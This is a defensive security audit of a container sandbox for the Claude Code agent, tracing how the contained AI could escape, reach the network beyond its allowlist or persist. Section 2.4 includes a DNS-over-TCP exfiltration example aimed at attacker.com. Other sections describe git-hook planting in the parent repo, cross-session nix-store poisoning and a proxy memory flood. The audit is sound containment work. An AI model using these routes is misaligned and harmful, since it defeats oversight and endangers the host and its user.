# Adversarial Security Audit — claude-container — 2026-05-22

Follow-on to `docs/security/audit-2026-05-22.md`. The prior audit's gaps are
fixed (through commit 22f256b). This audit assumes the threat model in the
task description and looks for what the prior audit missed.

## 1. Threat model recap

The user accepts two losses: workspace corruption, and exfil via
proxy-allowed domains. Every other failure on the "user does NOT want" list
(escape, privesc, off-allowlist network, host-fs read beyond workspace,
resource exhaustion crashing host, rule self-modification, lateral session
access, persistence beyond container, host code execution via in-session
mechanism, dashboard token theft) must be structurally impossible — not
"Claude was nice enough not to try."

## 2. Layer-by-layer trace of forbidden attacks

### 2.1 Container escape

Layers blocking: rootless docker (`internal/docker/docker.go:519` —
`IsRootless()`), default seccomp + AppArmor + `no-new-privileges`
(`internal/docker/docker.go:162-166`), no docker socket
(`TestSecurity_NoDockerSocketLeak`, `cmd/security_e2e_test.go:598`), no
privileged mounts (grep of `RunArgs` shows only workspace, `/mnt/repo`,
`/claude` (with RO overlay), and the three credential files). The image
adds NET_ADMIN only to the proxy container
(`internal/httpproxy/httpproxy.go:241`), which Claude has no execve path
into (separate PID + mount namespaces). No single-point failure visible.

### 2.2 Host privilege escalation

Rootless docker (container uid 0 = unprivileged host uid).
`no-new-privileges:true` blocks `execve(setuid_binary)`. Default seccomp
denies `ptrace`, `bpf`, `kexec_load`, `init_module`, `unshare(CLONE_NEWUSER)`,
`keyctl`, etc. (`TestSecurity_SeccompProfile_Applied`,
`cmd/security_e2e_test.go:1292`, with empirical `keyctl` probe). Separate
PID namespace (`TestSecurity_PIDNamespace_Isolated`, line 1366) means
Claude cannot ptrace the mitmproxy uid 1500 — it lives in another PID
namespace entirely. The "nix profile install setuid binary + execve" path
dies on `no-new-privileges`.

### 2.3 Host filesystem read beyond workspace

Container's `/etc/passwd` is from the nix image, not the host
(`nix/image.nix:108-127` via shadowSetup); confirmed by
`TestSecurity_NoHostRootRead` (`cmd/security_e2e_test.go:711`). Three
explicitly-listed credential files mounted RO individually
(`internal/config/config.go:192-207`) — not directory mounts. Symlink
traversal blocked (`TestSecurity_Symlink_HostTraversalBlocked`, line 1087).
Residual: `/proc/cpuinfo`, `/proc/meminfo`,
`/proc/sys/kernel/random/boot_id`, `/sys/devices/...` leak host CPU model,
RAM total, boot ID. Passive fingerprinting; not on the forbidden list.

### 2.4 Network access outside the proxy allowlist

The load-bearing chain:

1. No NIC in Claude's netns. `--network container:claude-proxy_<session>`
   (`internal/docker/docker.go:257`) attaches Claude to the proxy's netns.
2. NET_ADMIN only on the proxy (`internal/httpproxy/httpproxy.go:241`).
   Claude cannot install nftables rules.
3. Default-deny output + tight allowlist (`nix/proxy-image.nix:51-92`):
   only `oif lo`, established/related, `meta skuid 1500` (mitmproxy),
   tcp dport 8080/8081, and tcp dport 53 accept. `udp dport 443` and
   `udp dport 53` drop. Everything else hits default policy drop.
4. NAT REDIRECT for TCP (`nix/proxy-image.nix:109-118`): every non-loopback
   TCP packet from uid != 1500 → `127.0.0.1:8080`. mitmproxy reads
   `SO_ORIGINAL_DST`.
5. `tcp_hosts: [".*"]` (`proxy/claude_proxy/app.py:148`) tunnels raw TCP
   through mitmproxy; the `tcp_start` handler
   (`proxy/claude_proxy/addon.py:87-139`) evaluates `tcp://host:port`
   against the rule store.
6. UDP/53 dropped; only Docker's embedded resolver at 127.0.0.11 over
   loopback works (`TestSecurity_DNS_ExternalUDP53_Blocked`, line 1061).

Possible bypasses I checked:

- **DNS-over-TCP exfil:** the filter chain accepts `tcp dport 53`
  (`nix/proxy-image.nix:80`), but the NAT redirect at the output_nat
  chain rewrites *all* tcp regardless of dest port. So
  `dig +tcp @attacker.com any.attacker.com` lands in mitmproxy and is
  evaluated as `tcp://attacker.com:53` against the rule store — not in
  the default allowlist, so it holds. **Blocked.**
- **IPv6:** `inet` family covers v4 + v6; Docker default networks
  don't allocate v6; default-deny on filter catches anything missed by
  the redirect.
- **Raw sockets:** rootless containers drop CAP_NET_RAW by default; and
  even if AF_PACKET worked, default-deny on output blocks egress.
- **Bind privileged port to receive inbound:** no port-forward configured
  on the Claude container; the only `-p` is `8081:8081` on the proxy.
  Claude cannot accept inbound connections.
- **MitM CA swap:** `/proxy-ca` is mounted RO (`internal/docker/docker.go:272`).
  Even if Claude refused to trust it, the L3 redirect still sends bytes
  to mitmproxy, which terminates TLS and applies the rule store.
- **Talk to embedded resolver to learn host network info:** `127.0.0.11`
  returns the docker network's view only (proxy container name + aliases).
  Minimal disclosure.

Chain holds.

### 2.5 Resource limit bypass

`internal/docker/docker.go:122-138` applies `--pids-limit`, `--memory`,
`--memory-swap`, `--cpus` to every Claude container. Tests at
`cmd/security_e2e_test.go:1136` and 1175 verify.

**Gap I found:** the *proxy* container has NO resource limits. `RunArgs`
in `internal/httpproxy/httpproxy.go:226-250` builds the proxy docker
command without `--memory`, `--pids-limit`, or `--cpus`. mitmproxy holds
full bodies of pending requests for `hold_timeout=3600s`
(`proxy/claude_proxy/app.py:54`). A Claude-driven flood of slow oversized
POSTs accumulates linearly in proxy memory; the proxy's cgroup has no
cap. See §4.1.

### 2.6 Self-modification of permission rules

`/claude/managed-settings.json` is file-level RO bind-overlayed on top of
the RW `/claude` directory (`internal/docker/docker.go:180-181`). Writes
return EROFS. `/etc/claude-code/managed-settings.json` (the actual file
Claude Code reads) is in the container's writable layer, but the
entrypoint re-copies from the RO source on every `docker start`
(`nix/image.nix:164-166`). So the GAP-2/GAP-5 ratchet path is structurally
blocked. `TestSecurity_ManagedSettings_ReadOnlyFromContainer` (line 972)
confirms. Sound.

### 2.7 Lateral access to other sessions

Per-session Docker network (`internal/httpproxy/httpproxy.go:40-43`,
`TestSecurity_SiblingIsolation`, line 1016). Per-session config and
proxy-state dirs on disk. Per-session 32-byte dashboard tokens
(`proxy/claude_proxy/app.py:110-114`).

**Residual: `claude-nix-store` volume is shared across all sessions.**
`/nix/var` (database + profiles) is hardcoded as `claude-nix-store`
(`internal/docker/docker.go:302`). A malicious session A could install a
hijacked derivation; session B with `-p anypackage` puts
`~/.nix-profile/bin` (resolving via A's persistent profile manifest) at
the front of PATH (`nix/image.nix:301-306`). Gated by victim opting into
`-p` — sessions without `EXTRA_PACKAGES` keep the default PATH. See §4.2.

### 2.8 Persistence beyond container lifecycle

No host `/etc`, `/var`, `/home`, or `/root` mount. The container's
`crontab`, `systemd`, etc. live in the writable layer and die with
`docker rm`. Workspace bind is host-visible but the host doesn't source
`/workspace/.bashrc`. The `claude-nix-store` vector is the only real
persistence path (§4.2).

### 2.9 Host code execution via git hooks / package hooks

Worktree mode mounts `/mnt/repo` RW (`internal/docker/docker.go:225`).
`core.hooksPath=/dev/null` is set on the worktree
(`nix/image.nix:227`) but NOT on the parent repo at `/mnt/repo`. Claude
can write `/mnt/repo/.git/hooks/pre-commit` or
`/mnt/repo/.git/config [core] hooksPath = /tmp/evil`. The trigger is
the user running git in the parent repo directly — **post-session host
tooling**, the same accepted bucket as `npm install` with a malicious
preinstall. Listed in §4.3 for explicit acknowledgment.

There is no IN-SESSION mechanism by which Claude can trigger host code
execution: no docker socket, no shared filesystem path the host
auto-reads, no IPC. The container's writes to `/workspace` are inert
until the host explicitly acts on them.

### 2.10 Token / credential theft

The Anthropic API key in `/claude/.credentials.json` (copied from the RO
mount at `nix/image.nix:134-139`) is readable by Claude. Exfil of that
key is in the "proxy-allowed exfil" accepted bucket: under
`--profile=default` Claude could post it to a GitHub gist. Accepted.

The dashboard auth token at `<configDir>/proxy-state/<session>/dashboard-token`
is NOT mounted into Claude's container — only the proxy container mounts
`stateMount + ":/config"` (`internal/httpproxy/httpproxy.go:243`).
Claude has no filesystem path to read it. Unauthenticated dashboard
endpoints (`/`, `/api/health`, `/api/pending`, `GET /api/rules`,
`proxy/claude_proxy/dashboard.py:317-328`) cannot reveal the token; they
return state, never secrets.

The mitmproxy CA cert is RO-mounted. Replacing it from inside the
container fails (EROFS), and even if Claude refused to trust it, the L3
redirect still routes packets through mitmproxy.

Sound.

## 3. Per-profile assessment

- **`low`** (yolo, `.*` allow, no denies): network confinement neutered by
  design. Container escape / privesc / resource bypass still blocked.
  Worst case: full workspace damage + arbitrary egress + post-session
  host-tooling hooks. **Safe under stated model**, with explicit
  understanding that "exfil to anywhere" is on the table.
- **`default`** (yolo, dev allowlist): same as `low` except egress is the
  named dev allowlist. Exfil to GitHub/npm possible — accepted. **Safe.**
- **`auto`** (auto-mode, defaultMode=auto, no static denies): the
  dashboard-deny rules are intentionally skipped
  (`internal/sandbox/sandbox.go:434-442`) to keep the classifier in
  charge. The real boundary remains the 32-byte auth token Claude can't
  read. Structurally equivalent to `default`. **Safe.**
- **`med`** (non-yolo, dontAsk, smaller allowlist, sensitive-path denies):
  the sensitive-path denies (`Read(~/.ssh/**)`, etc.) are belt-and-suspenders
  — those paths aren't mounted into the container anyway. Smaller bash
  allowlist. **Safe**, slightly tighter than `default`.
- **`high`** (Anthropic-only, strict denies): smallest exfil surface.
  **Safe**, lowest accepted-risk envelope.

The containment chain (kernel + namespaces + nftables + mitmproxy) is
identical across all five profiles; only the *intended-action* permission
filters differ.

## 4. Remaining risks beyond "workdir + proxy-allowed exfil"

### 4.1 Proxy container has no resource limits (host DoS)

`internal/httpproxy/httpproxy.go:226-250` does not pass `--memory`,
`--pids-limit`, or `--cpus` to the proxy. mitmproxy holds full request
bodies of pending flows for `hold_timeout=3600s`. A Claude-driven flood
of oversized POSTs to unallowlisted domains accumulates linearly in proxy
memory with no cgroup cap. The 4 GB / 4 CPU / 4096 pids limit on Claude
itself doesn't help — the proxy is a separate container. This is the only
non-accepted "kill the host's docker daemon" surface I can identify that
doesn't require a kernel bug. Fix: apply `resourceLimitArgs()` (or
tighter, e.g. 512 MB / 256 pids / 1 CPU) in the proxy's `RunArgs`.

### 4.2 `claude-nix-store` volume cross-session persistence

The `claude-nix-store` Docker volume at `/nix/var`
(`internal/docker/docker.go:302`) is shared across all sessions for the
same daemon. `/nix/var/nix/profiles/per-user/*` persists. Session A
installs a malicious derivation; session B with `-p somepackage` adds
`~/.nix-profile/bin` to PATH (`nix/image.nix:303-305`) and resolves to
A's poisoned binaries. Gated by the victim session opting into `-p`, but
a structural cross-session escape nonetheless.

Fix options: per-session volume (UX cost: lose caching), reset
`/nix/var/nix/profiles/per-user/*` at entrypoint, or drop the persistent
volume entirely (re-install on each session — cachix makes this fast).

### 4.3 Worktree mode: parent repo `.git/` is RW

In worktree mode, `/mnt/repo` is the host parent repo bind-mounted RW
(`internal/docker/docker.go:225`). `core.hooksPath=/dev/null` is set
on the worktree (`nix/image.nix:227`) but NOT on the parent. Claude can
write `/mnt/repo/.git/hooks/pre-commit` or hostile `.git/config` entries
(`[alias]`, `[core] hooksPath`, `[includeIf]`). When the user later runs
git in the parent repo (not the worktree), the hooks fire on the host.

This is **post-session host tooling**, in the bucket the threat model
explicitly accepts ("npm install with malicious preinstall"). Calling
it out separately because (a) less obvious than npm and (b) specific to
worktree mode.

Mitigation: either mount `/mnt/repo:ro` (worktree creation does work
purely through the writable `gitdir` overlay — confirm in testing), or
add a second `git -C /mnt/repo config core.hooksPath /dev/null` in the
entrypoint (writes host config but is invasive), or document explicitly.

### 4.4 Host fingerprinting via /proc, /sys

Container `/proc/cpuinfo`, `/proc/meminfo`,
`/proc/sys/kernel/random/boot_id` leak host CPU model, RAM total, boot
ID. Combined with allowed exfil, lets Claude fingerprint host. Minor;
mostly informational. Docker offers `--read-only` + tmpfs masks; UX cost
is high.

### 4.5 `bypassPermissionsModeAccepted` is force-set

`nix/image.nix:144-149` pre-accepts the Claude Code yolo dialog.
Intentional per the prior audit. No security loss given the container is
the real boundary, but a user attaching interactively never sees the
standard "you're in yolo mode" warning. Document.

## 5. Bottom line

The user can run `claude-container --profile=default --yolo` (or
`--profile=low`) and trust that worst observable outcome is workspace
damage plus exfil-through-allowed-domains, **with three caveats**:

1. **Proxy resource limits missing (§4.1).** A Claude-driven proxy memory
   flood can hurt host docker daemon availability. Doesn't enable code
   exec or exfil, but does cross the "fork bomb / memory bomb cannot
   crash host" line in the threat model. Trivially fixable.
2. **Worktree-mode parent `.git/` is RW (§4.3).** Same category as the
   npm-preinstall accepted risk, but broader than the documented example.
3. **`claude-nix-store` cross-session persistence (§4.2).** Gated by the
   victim session using `-p`, but a structural lateral path. Removable.

None of the forbidden outcomes (escape, privesc, host-fs read beyond the
explicit mounts, off-allowlist network or DNS, rule self-mutation, dashboard
token theft, in-session host code execution) has a single-point failure
across `low`, `default`, `auto`, `med`, or `high`. The containment chain
(rootless docker + seccomp + AppArmor + no-new-privileges + separate
namespaces + nftables default-deny + mitmproxy redirect + RO managed-settings
overlay + per-session networks and tokens) is sound. Profile choice changes
*intended* surface, not *contained* surface.

Verdict: **safe-with-caveats.** Fix §4.1 (cheap, isolated change) and the
design matches the stated threat model exactly.
